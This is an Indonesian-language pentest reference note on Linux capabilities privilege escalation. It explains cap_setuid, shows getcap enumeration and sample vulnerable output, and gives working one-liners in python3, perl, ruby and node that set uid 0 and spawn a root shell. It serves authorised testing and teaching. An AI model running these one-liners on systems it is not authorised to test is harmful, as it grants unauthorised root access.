# Exploiting Capabilities (Linux Capabilities Privilege Escalation)

> **Tujuan:** Memanfaatkan binary dengan **Linux capabilities** berbahaya (misal `cap_setuid`) untuk memperoleh **shell sebagai root** — tanpa perlu SUID bit maupun sudo.

---

## Penjelasan Singkat

**Linux Capabilities** memecah privilege root menjadi unit-unit granular yang dapat ditempelkan pada binary. Capability seperti `cap_setuid` memungkinkan proses **mengubah uid-nya sendiri menjadi 0 (root)** — artinya binary ber-capability dapat spawn root shell tanpa perlu SUID bit maupun sudo.

| Item | Detail |
|------|--------|
| **Cara Deteksi** | `getcap -r / 2>/dev/null` |
| **Ciri Khas** | Capability menempel pada binary (`python3 cap_setuid=ep`) |
| **Hasil Eksploitasi** | Shell dengan `uid=0(root)` |

> **Suffix Capability:** `=ep` berarti *effective* + *permitted*. Suffix `e` (effective) membuat capability langsung aktif saat binary dieksekusi.

---

## Cek Hak Capabilities

```bash
getcap -r / 2>/dev/null
# Mencari semua binary yang memiliki Linux capabilities
```

Tampilan **aman** (tidak ada capability berbahaya):

```text
tester@webserver:~$ getcap -r / 2>/dev/null
tester@webserver:~$
```

> Tidak ada output — tidak ada binary dengan capability khusus, konfigurasi bersih.

Tampilan **rentan** (ada capability berbahaya):

```text
www-data@jobportal:~$ getcap -r / 2>/dev/null
/usr/bin/python3.11 cap_setuid=ep            ← RENTAN! interpreter bisa setuid(0)
/usr/bin/perl cap_setuid=ep                  ← RENTAN! interpreter bisa setuid(0)
/usr/bin/ping cap_net_raw=ep                 ← wajar, ping memang butuh raw socket
```

Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:

```bash
find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
```

- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID → [SUID.md](SUID.md)
- `sudo -l` → enumerasi permission sudoers → [Sudo.md](Sudo.md)
- `getcap -r / 2>/dev/null` → enumerasi capabilities (vektor file ini)

> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Oneliner inilah yang dipakai pada PoC laporan (langkah eskalasi root) karena satu command langsung menyingkap ketiga vektor LPE sekaligus.

---

## Cek GTFOBins

Untuk tiap binary ber-capability → cek di [https://gtfobins.github.io](https://gtfobins.github.io) bagian **Capabilities** untuk melihat apakah binary tersebut dapat disalahgunakan.

---

## Contoh Eksploitasi — cap_setuid

```bash
# cap_setuid pada python — spawn root shell
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'

# cap_setuid pada perl
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/sh";'

# cap_setuid pada ruby
ruby -e 'Process.setuid(0); exec "/bin/sh"'

# cap_setuid pada node
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
```

| Binary | Capability | Teknik |
|--------|------------|--------|
| `python3` | `cap_setuid=ep` | `os.setuid(0)` + `execl("/bin/sh")` |
| `perl` | `cap_setuid=ep` | `setuid(0)` + `exec "/bin/sh"` |
| `ruby` | `cap_setuid=ep` | `Process.setuid(0)` + `exec` |
| `node` | `cap_setuid=ep` | `setuid(0)` + `spawn("/bin/sh")` |
